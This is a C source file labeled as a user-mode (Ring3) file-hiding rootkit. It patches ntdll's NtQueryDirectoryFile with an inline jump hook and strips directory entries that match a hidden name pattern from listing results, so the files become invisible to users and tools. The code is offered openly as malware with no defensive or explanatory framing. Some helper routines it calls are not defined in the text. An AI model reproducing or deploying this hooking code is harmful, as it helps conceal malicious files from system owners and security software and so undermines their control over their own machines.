#include <winternl.h>
#include <windows.h>
#define JMP(from, to) (int)(((int)to - (int)from) - 5);

/********************************************************************************
	File Hidden Rookit Ring3
	Hook NtQueryDirectoryFile API To Hide File.

	http://blog.airesoft.co.uk/code/fileid.cpp
	http://blog.csdn.net/liuhanlcj/article/details/43946629
	http://blog.csdn.net/xugangjava/article/details/17093741
********************************************************************************/

#define FileBothDirectoryInformation	 3
#define FileIdBothDirectoryInformation	37
#define STATUS_NO_MORE_FILES	0x80000006

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;
typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;
BYTE NewNtQDFSpace[16];

NTSTATUS(WINAPI*NormalNtQDFFunc)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PVOID ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
	);

NTSTATUS WINAPI ZwNewNtQueryDirectoryFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PVOID ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan)
{

	NTSTATUS ReturnContent = NormalNtQDFFunc(FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);

	if (!NT_SUCCESS(ReturnContent)) return ReturnContent;
	else if (IoStatusBlock->Information == 0) return ReturnContent;
	else if ((FileInformationClass != FileBothDirectoryInformation) &&
		(FileInformationClass != FileIdBothDirectoryInformation)) return ReturnContent;

	if (FileInformationClass == FileBothDirectoryInformation) {
		PFILE_BOTH_DIR_INFORMATION pHdr = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		PFILE_BOTH_DIR_INFORMATION pLast = NULL;
		BOOL bLastFlag = FALSE;
		do {
			bLastFlag = !(pHdr->NextEntryOffset);
			if (memcmp( pHdr->FileName , HiddenPatten, wcslen(HiddenPatten)) == 0) {
				if (bLastFlag) {
					if (!pLast) {
						return STATUS_NO_MORE_FILES;
					}
					pLast->NextEntryOffset = 0;
					break;
				}
				else {
					int iPos = ((ULONG)pHdr) - (ULONG)FileInformation;
					int iLeft = (DWORD)Length - iPos - pHdr->NextEntryOffset;
					RtlCopyMemory((PVOID)pHdr, (PVOID)((char *)pHdr + pHdr->NextEntryOffset), (DWORD)iLeft);
					continue;
				}
			}
			pLast = pHdr;
			pHdr = (PFILE_BOTH_DIR_INFORMATION)((char *)pHdr + pHdr->NextEntryOffset);
		} while (!bLastFlag);
	}
	else {
		PFILE_ID_BOTH_DIR_INFORMATION pHdr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		PFILE_ID_BOTH_DIR_INFORMATION pLast = NULL;
		BOOL bLastFlag = FALSE;
		do {
			bLastFlag = !(pHdr->NextEntryOffset);
			if (memcmp(pHdr->FileName, HiddenPatten, wcslen(HiddenPatten)) == 0) {
				if (bLastFlag) {
					if (!pLast) {
						return STATUS_NO_MORE_FILES;
					}
					pLast->NextEntryOffset = 0;
					break;
				}
				else {
					int iPos = ((ULONG)pHdr) - (ULONG)FileInformation;
					int iLeft = (DWORD)Length - iPos - pHdr->NextEntryOffset;
					RtlCopyMemory((PVOID)pHdr, (PVOID)((char *)pHdr + pHdr->NextEntryOffset), (DWORD)iLeft);
					continue;
				}
			}
			pLast = pHdr;
			pHdr = (PFILE_ID_BOTH_DIR_INFORMATION)((char *)pHdr + pHdr->NextEntryOffset);
		} while (!bLastFlag);
	}
	return ReturnContent;
}

void SetUpNtQDFHook()
{
	DWORD NtQDFAddr = (DWORD)GetProcAddress((HMODULE)GetNTDllMod(), "NtQueryDirectoryFile");
	MEMwrite((void*)NewNtQDFSpace, (void*)NtQDFAddr, 16);
	SetMemExecuable((LPVOID)NewNtQDFSpace, sizeof(NewNtQDFSpace));
	NormalNtQDFFunc = (NTSTATUS(WINAPI *)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN))(&NewNtQDFSpace);
	AsmJump(NtQDFAddr, ZwNewNtQueryDirectoryFile, 0);
}
